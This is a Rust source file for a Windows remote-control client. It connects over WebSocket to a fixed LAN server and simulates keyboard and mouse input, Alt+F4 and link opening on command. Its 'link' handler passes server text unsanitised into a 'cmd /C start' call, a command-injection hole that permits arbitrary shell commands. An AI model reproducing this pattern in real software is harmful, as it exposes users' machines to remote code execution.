use std::{collections::{HashMap, HashSet}, f64::INFINITY, net::{IpAddr, SocketAddr}, pin::Pin, process::Command, sync::Arc, time::{Duration, SystemTime, UNIX_EPOCH}};

use futures::{SinkExt, StreamExt};
use log::{error, info, trace, warn};
use tokio::{net::{TcpListener, TcpStream}, sync::Mutex};
use tokio_tungstenite::{accept_async, tungstenite::Message};
use windows::Win32::UI::{Input::KeyboardAndMouse::{keybd_event, ActivateKeyboardLayout, GetAsyncKeyState, SendInput, INPUT, INPUT_KEYBOARD, INPUT_MOUSE, KEYBDINPUT, KEYBD_EVENT_FLAGS, KEYEVENTF_EXTENDEDKEY, KEYEVENTF_KEYUP, MOUSEEVENTF_LEFTDOWN, MOUSEEVENTF_LEFTUP, MOUSEINPUT, VK_CAPITAL, VK_F4, VK_MENU}, WindowsAndMessaging::SetCursorPos};
use async_trait::async_trait;
use ezsockets::{client::ClientCloseMode, ClientConfig, CloseFrame};
use std::io::BufRead;


struct Client {
    handle: ezsockets::Client<Self>
}

#[async_trait]
impl ezsockets::ClientExt for Client {
    type Call = ();

    async fn on_text(&mut self, text: ezsockets::Utf8Bytes) -> Result<(), ezsockets::Error> {
        println!("received message: {text}");

        if text == "ping" {
            let _ = self.handle.text("pong");
        }
        // messages should be in the following format: key=val;key2=val2;
        let parts: Vec<&str> =  text.split(";").collect();  
        let mut action: String = String::new();
        let mut param: String = String::new();
        let mut val: String = String::new();

        for arg in parts {
            let parts: Vec<&str> = arg.split("=").collect();
            
            if parts.len() != 2 {
                let res = self.handle.text(format!("Invalid body; expected 2 parts for arg {}", arg).to_string());
                if let Err(_) = res {
                    error!("Failed to send invalid request body");
                }
                continue;
            }
            
            let [key, value] = parts.as_slice().try_into().unwrap();

            match key {
                "action" => { action = value.to_string(); }
                "param" => { param = value.to_string(); }
                "value" => { val = value.to_string(); }
                _ => {
                    warn!("{}",format!("Invalid key {}!", key))
                }
            }
        }

        
        if action == "do" {
            match param.as_str() {
                "caps" => { 
                    println!("Running caps");
                    unsafe {
                        let mut input_down = INPUT {
                            r#type: INPUT_KEYBOARD,
                            Anonymous: std::mem::zeroed(),
                        };
                        input_down.Anonymous.ki = KEYBDINPUT {
                            wVk: VK_CAPITAL,
                            wScan: 0,
                            dwFlags: KEYBD_EVENT_FLAGS(0),
                            time: 0,
                            dwExtraInfo: 0,
                        };

                        let mut input_up = INPUT {
                            r#type: INPUT_KEYBOARD,
                            Anonymous: std::mem::zeroed(),
                        };
                        input_up.Anonymous.ki = KEYBDINPUT {
                            wVk: VK_CAPITAL,
                            wScan: 0,
                            dwFlags: KEYEVENTF_KEYUP,
                            time: 0,
                            dwExtraInfo: 0,
                        };
                        let inputs = &[input_down, input_up];
                        SendInput(inputs, std::mem::size_of::<INPUT>() as i32);
                        let _ = self.handle.text("ok".to_string());
                    }
                },
                "mouse" => {
                    let parts: Vec<&str> = val.split(",").collect();
                    unsafe {
                        SetCursorPos(parts[0].parse().unwrap(), parts.last().unwrap().parse().unwrap());
                    }
                    let _ = self.handle.text("ok".to_string());
                }
                "ldown" => {
                    let parts: Vec<&str> = val.split(",").collect();
                    unsafe {
                        let mut click = INPUT {
                            r#type: INPUT_MOUSE,
                            Anonymous: std::mem::zeroed(),
                        };
                        click.Anonymous.mi = MOUSEINPUT {
                            dx: parts[0].parse().unwrap(),
                            dy: parts[0].parse().unwrap(),
                            dwExtraInfo: 0,
                            dwFlags: MOUSEEVENTF_LEFTDOWN,
                            time: 0,
                            mouseData: 0
                        };
                        let inputs = vec![click];
                        SendInput(&inputs, std::mem::size_of::<INPUT>() as i32);
                    }
                }
                "lup" => {
                    let parts: Vec<&str> = val.split(",").collect();
                    unsafe {
                        let mut click = INPUT {
                            r#type: INPUT_MOUSE,
                            Anonymous: std::mem::zeroed(),
                        };
                        click.Anonymous.mi = MOUSEINPUT {
                            dx: parts[0].parse().unwrap(),
                            dy: parts[0].parse().unwrap(),
                            dwExtraInfo: 0,
                            dwFlags: MOUSEEVENTF_LEFTUP,
                            time: 0,
                            mouseData: 0
                        };
                        
                        let inputs = vec![click];
                        SendInput(&inputs, std::mem::size_of::<INPUT>() as i32);
                    }
                }
                "close" => {
                    println!("Closing");
                    unsafe {
                        let mut f4_down = INPUT {
                            r#type: INPUT_KEYBOARD,
                            Anonymous: std::mem::zeroed(),
                        };
                        f4_down.Anonymous.ki = KEYBDINPUT {
                            wVk: VK_F4,
                            wScan: 0,
                            dwFlags: KEYBD_EVENT_FLAGS(0),
                            time: 0,
                            dwExtraInfo: 0,
                        };

                        let mut f4_release = INPUT {
                            r#type: INPUT_KEYBOARD,
                            Anonymous: std::mem::zeroed(),
                        };
                        f4_release.Anonymous.ki = KEYBDINPUT {
                            wVk: VK_F4,
                            wScan: 0,
                            dwFlags: KEYEVENTF_KEYUP,
                            time: 0,
                            dwExtraInfo: 0,
                        };

                        let mut alt_down = INPUT {
                            r#type: INPUT_KEYBOARD,
                            Anonymous: std::mem::zeroed(),
                        };
                        alt_down.Anonymous.ki = KEYBDINPUT {
                            wVk: VK_MENU,
                            wScan: 0,
                            dwFlags: KEYBD_EVENT_FLAGS(0),
                            time: 0,
                            dwExtraInfo: 0,
                        };

                        let mut alt_release = INPUT {
                            r#type: INPUT_KEYBOARD,
                            Anonymous: std::mem::zeroed(),
                        };
                        alt_release.Anonymous.ki = KEYBDINPUT {
                            wVk: VK_MENU,
                            wScan: 0,
                            dwFlags: KEYEVENTF_KEYUP,
                            time: 0,
                            dwExtraInfo: 0,
                        };
                        let inputs = &[alt_down,f4_down,f4_release, alt_release];
                        SendInput(inputs, std::mem::size_of::<INPUT>() as i32);
                        let _ = self.handle.text("ok".to_string());
                    }
                }
                "link" => {
                    println!("Opening link {}", val);
                    Command::new("cmd").args(["/C", format!("start {}", val).as_str()]).spawn().unwrap();
                    let _ = self.handle.text("ok".to_string());
                }
                _ => { println!("Invalid arg {}", param); }
            }
        }
        
        else if action == "get" {
            self.handle.text("Getting data".to_string());
        } else {
            println!("Invalid action {}", action);
        }
        Ok(())
    }

    async fn on_binary(&mut self, bytes: ezsockets::Bytes) -> Result<(), ezsockets::Error> {
        println!("received bytes: {bytes:?}");
        Ok(())
    }

    async fn on_call(&mut self, call: Self::Call) -> Result<(), ezsockets::Error> {
        let () = call;
        Ok(())
    }

    async fn on_connect(&mut self) -> Result<(), ezsockets::Error> {
        println!("Connected to server");
        println!("Sending registration");
        let _ = self.handle.text("name=onni");
        Ok(())
    }
    
    fn on_close<'life0, 'async_trait>(
        &'life0 mut self,
        _frame: Option<CloseFrame>,
    ) -> Pin<Box<dyn Future<Output = Result<ClientCloseMode, ezsockets::Error>> + Send + 'async_trait>>
    where
        Self: 'async_trait,
        'life0: 'async_trait,
    {
        println!("Lost connection to server");

        Box::pin(async { Ok(ClientCloseMode::Reconnect) })
    }

}

#[tokio::main]
async fn main() {
    let cfg = ClientConfig::new("ws://192.168.32.144:8000/ws");
    let config = cfg.socket_config(ezsockets::SocketConfig { heartbeat: Duration::from_secs(3), timeout: Duration::from_secs(8), ..Default::default() })
        .reconnect_interval(Duration::from_secs(3))
        .max_reconnect_attempts(9999999);

    let (handle, future) = ezsockets::connect(|handle| Client { handle }, config).await;

    future.await.unwrap();
}
